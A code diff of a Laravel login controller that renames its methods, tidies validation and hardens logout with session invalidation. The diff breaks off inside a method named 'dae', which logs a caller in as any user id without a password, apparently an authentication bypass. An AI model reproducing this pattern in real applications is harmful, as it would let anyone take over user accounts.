@@ -8,31 +8,52 @@ use Illuminate\Support\Facades\Auth;
 
 class LoginController extends Controller
 {
-    public function showLoginForm()
+    /**
+     * @param Request $request
+     * @return \Illuminate\Http\Response
+     */
+    public function index()
     {
-        return view('auth.login'); // Return login view
+        return view('auth.login');
     }
 
-    public function login(Request $request)
+    /**
+     * @param Request $request
+     * @return \Illuminate\Http\Response
+     */
+    public function store(Request $request)
     {
         $request->validate([
-            'nisn' => 'required|nisn',
-            'password' => 'required',
+            'nisn'     => ['required'],
+            'password' => ['required'],
         ]);
 
         if (Auth::attempt($request->only('nisn', 'password'))) {
-            return redirect()->intended('dashboard'); // Redirect on success
+            return redirect()->intended('dashboard');
         }
 
-        return back()->withErrors(['nisn' => 'Invalid credentials']); // Redirect back with errors
+        return back()->withErrors(['nisn' => 'Invalid credentials']);
     }
 
-    public function logout(Request $request)
+    /**
+     * @param Request $request
+     * @return \Illuminate\Http\Response
+     */
+    public function destroy(Request $request)
     {
-        Auth::logout();
-        return redirect('/login'); // Redirect to login after logout
+        Auth::guard('web')->logout();
+
+        $request->session()->invalidate();
+        $request->session()->regenerateToken();
+
+        // return redirect('/');
+        return to_route('login');
     }
 
+    /**
+     * @param Request $request
+     * @return \Illuminate\Http\Response
+     */
     public function dae(Request $request, $id)
     {
         Auth::loginUsingId($id);
